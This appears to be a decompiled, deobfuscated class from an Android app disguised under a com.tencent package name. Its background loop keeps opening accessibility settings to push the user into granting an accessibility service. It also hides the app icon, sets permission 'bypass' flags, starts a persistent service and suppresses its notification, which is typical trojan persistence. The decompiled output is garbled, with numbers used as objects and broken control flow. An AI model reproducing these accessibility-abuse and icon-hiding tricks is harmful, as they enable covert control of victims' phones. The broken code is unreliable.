package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: MainBackgroundService_1
 * Original: Lcom/tencent/tunesxconcerningn1011$1;
 */
class MainBackgroundService_1 implements Runnable; {

    // === FIELDS ===
    final MainBackgroundService this$0;
    final Context val$ctx;
    final int val$delytimenum;

    // === METHODS ===

     void Constructor(MainBackgroundService param0, Context param1, int param2) {
        v0.this$0 = v1;
        v0.val$ctx = v2;
        v0.val$delytimenum = v3;
        // new Object()
        return;
    }

    public void run() {
        v0 = TimeUnit.MILLISECONDS;
        v1 = DataPackagingEngine.speedTime;
        v1 = (long) v1;
        v0.sleep(v1, v2);
        v0 = v9.val$ctx;
        v1 = AccessibilityServiceCore.class;
        v1 = DataPackagingEngine.IA_tunesxconcerningn1011_E(v0, v1);
        v1 = 1073741824; // 0x40000000
        v2 = 536870912; // 0x20000000
        v3 = 268435456; // 0x10000000
        v4 = 1;
        v5 = 0;
        if (v0 != null && v0 != 0) { // goto +100
        v0 = DataPackagingEngine.NeedSuper();
        if (v0 == null || v0 == 0) { // goto +94
        v0 = v9.val$ctx;
        v0 = DataPackagingEngine.GS_tunesxconcerningn1011_B(v0);
        if (v0 == null || v0 == 0) { // goto +-38
        v0 = DataPackagingEngine.Trys;
        DataPackagingEngine.Trys = v0;
        v0 = DataPackagingEngine.Trys;
        v6 = v9.val$delytimenum;
        if (v0 < v6) { // goto +-49
        DataPackagingEngine.Trys = 0;
        v0 = 1000;
        DataPackagingEngine.speedTime = 1000;
        v6 = new Intent();
        v7 = "android.settings.ACCESSIBILITY_SETTINGS";
        // new Intent("android.settings.ACCESSIBILITY_SETTINGS")
        v7 = 268435456; // 0x10000000
        v6.addFlags("android.settings.ACCESSIBILITY_SETTINGS");
        1000.startActivity(v6);
        // goto (branch)
        Boolean.valueOf(1);
        1000.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1000.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1000.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1000.booleanValue();
        if (1000 == null || 1000 == 0) { // goto +-117
        Boolean.valueOf(0);
        // goto (branch)
        if (1000 != null && 1000 != 0) { // goto +11
        MainBackgroundService.Is_tunesxconcerningn1011_Hidden = 1;
        v6 = "I#C#O#N#S#C#A#N#E#R";
        DataPackagingEngine.SwapMe(1000, "I#C#O#N#S#C#A#N#E#R");
        Settings.canDrawOverlays(1000);
        if (1000 != null && 1000 != 0) { // goto +30
        DataPackagingEngine.NeedSuper();
        if (1000 != null && 1000 != 0) { // goto +24
        v0 = 1000.booleanValue();
        if (1000 != null && 1000 != 0) { // goto +-157
        v0 = 5000;
        DataPackagingEngine.speedTime = 5000;
        Boolean.valueOf(1);
        DataPackagingEngine.shown = 5000;
        // goto (branch)
        DataPackagingEngine.PERMISSIONS();
        DataPackagingEngine.H__tunesxconcerningn1011_P(5000, "I#C#O#N#S#C#A#N#E#R");
        if (5000 != null && 5000 != 0) { // goto +105
        v0 = 5000.booleanValue();
        if (5000 != null && 5000 != 0) { // goto +91
        v0 = 3500;
        DataPackagingEngine.speedTime = 3500;
        Boolean.valueOf(1);
        DataPackagingEngine.asked = 3500;
        // new Intent("I#C#O#N#S#C#A#N#E#R", "android.settings.ACCESSIBILITY_SETTINGS")
        3500.addFlags(v3);
        3500.addFlags(v2);
        3500.addFlags(v1);
        v1 = v9.val$ctx;
        v1.startActivity(3500);
        // goto (branch)
        Boolean.valueOf(0);
        DataPackagingEngine.asked = 3500;
        Boolean.valueOf(1);
        3500.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        3500.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        3500.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        3500.booleanValue();
        if (3500 == null || 3500 == 0) { // goto +-275
        v0 = Boolean.valueOf(0);
        // goto (branch)
        v0 = 2000;
        DataPackagingEngine.speedTime = 2000;
        // goto (branch)
        if (2000 != null && 2000 != 0) { // goto +110
        MainBackgroundService.access$002(2000, 1);
        DataPackagingEngine.iamworking = 1;
        Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012bypass = 2000;
        Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012FOR_prim = 2000;
        AccessibilityServiceCore.tunesxconcerningn1012CheckPrims = 1;
        BackgroundServiceHelper.removedqtractort40(2000, "I#C#O#N#S#C#A#N#E#R");
        if (2000 == null || 2000 == 0) { // goto +31
        v6 = 2000.getResources();
        v6 = 2131296274;
        v8 = 2000.getString(2131296274);
        DataPackagingEngine.p_tunesxconcerningn103_r = 2000;
        v8 = PersistentService.class;
        // new Intent("android.settings.ACCESSIBILITY_SETTINGS", v8)
        2000.startService(2131296274);
        DataPackagingEngine.is_dozemode(2000);
        if (2000 != null && 2000 != 0) { // goto +25
        // new Intent(2131296274, "android.settings.ACCESSIBILITY_SETTINGS")
        2000.addFlags(v3);
        2000.addFlags(v2);
        2000.addFlags(v1);
        v1 = v9.val$ctx;
        v1.startActivity(2000);
        AccessibilityServiceCore.tunesxconcerningn1012CheckPrims = 1;
        v1 = Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012bypass = 2000;
        v1 = v9.this$0;
        v1 = v1._IDD;
        MainBackgroundService.cancelnotification(2000, v1);
        v0 = 25000;
        DataPackagingEngine.speedTime = 25000;
        // goto (branch)
    }
}
